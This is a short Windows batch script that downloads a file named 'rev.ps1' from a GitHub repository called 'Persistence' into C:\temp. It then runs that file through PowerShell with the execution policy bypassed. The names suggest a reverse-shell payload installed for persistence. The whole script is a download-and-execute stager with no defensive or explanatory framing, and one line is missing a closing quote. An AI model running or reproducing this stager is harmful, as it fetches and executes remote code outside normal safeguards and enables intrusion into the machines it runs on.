:: Define the URL of the file you want to download
set "url=https://raw.githubusercontent.com/Tziampazis/Persistence/main/rev.ps1"

:: Define the destination file path where you want to save the downloaded file
set "destination=C:\temp\rev.ps1"

:: Use curl to download the file
curl -o "%destination%" -L "%url%

powershell.exe -ExecutionPolicy Bypass -File "C:\temp\rev.ps1"